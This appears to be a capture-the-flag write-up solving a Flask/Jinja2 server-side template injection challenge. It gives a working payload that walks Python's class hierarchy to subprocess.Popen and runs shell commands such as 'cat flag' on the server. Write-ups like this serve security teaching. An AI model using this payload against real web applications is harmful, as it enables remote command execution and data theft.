Title: SSTI

Description

```
I only talk to smart ppl (not you)

(also only smart ppl can execute the binary)

Link: http://alpha.8059blank.ml:4004
Mirror: http://beta.8059blank.ml:4004

Author: Lucas
```

Visiting the webpage, it shows a textbox, and a title of 'School of Scholars and Top Intelligents':

![image](https://user-images.githubusercontent.com/63996033/197450310-f780fff7-16c2-48ba-ba7b-c585bda6c747.png)

The main clue here is SSTI, not to be confused with the title of the webpage: SSTI (Server Side Template Injection). So we need to inject code into the textbox which we can run shell and commands to find the flag.
This webpage gives a good flow of what we can do: https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

In the textbox, we need to use a payload inside of {{}}. The one we will try is  ```{{‘’.__class__.__mro__}}```

![image](https://user-images.githubusercontent.com/63996033/197451069-92075e43-9f1a-4d64-b67d-7aa661192f56.png)
![image](https://user-images.githubusercontent.com/63996033/197451084-9b8605ff-08f6-4515-9deb-4ad93b51a3ba.png)

We are now able to access the class objects. We will add '[1].__subclasses__()' at the end of the payload to access the subclasses which allows us to get the shell commands.

![image](https://user-images.githubusercontent.com/63996033/197451331-0034c595-acfc-45a6-a30c-f83e7fd5bee4.png)
![image](https://user-images.githubusercontent.com/63996033/197451345-a136effb-a90a-46b4-b37a-c17ac9bf3199.png)

Nice! 
We now need to access  ```<class 'subprocess.Popen'>```, which is element 350 (by trial and error, or counting will work but is time consuming).

![image](https://user-images.githubusercontent.com/63996033/197451533-dcd7da50-9851-471a-8b7a-350ac019856c.png)
![image](https://user-images.githubusercontent.com/63996033/197451547-f3dc39f2-a6c1-455d-aa8b-91c6e54e4b4c.png)

Using info from this: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-subprocesspopen
We can add ('<SHELL COMMAND>',shell=True,stdout=-1).communicate()[0].strip() to the end of our payload to do shell commands. The first command we will do is 'ls' to list all files in the directory.

![image](https://user-images.githubusercontent.com/63996033/197452312-7354f166-6bae-47e0-847f-3a2cd98c7ef7.png)

This shows a file called 'flag' which is what we want. Next command is 'cat flag' to access the contents of that file and get the flag.

![image](https://user-images.githubusercontent.com/63996033/197452417-da4aee4d-729e-4765-b9eb-d7874f1691d7.png)

Doing so will give us this. A simple Ctrl+F gives us:

![image](https://user-images.githubusercontent.com/63996033/197452479-fe5f3c82-1b02-43b7-a45b-0bd33394ef62.png)

We got our flag using this:
```
{{ ''.__class__.__mro__[1].__subclasses__()[350]('cat flag',shell=True,stdout=-1).communicate()[0].strip()}}
```

Flag: ACSI{s0m3t1m3s_my_g3n1u5...it5...it5_alm05t_fr1ght3ning...}
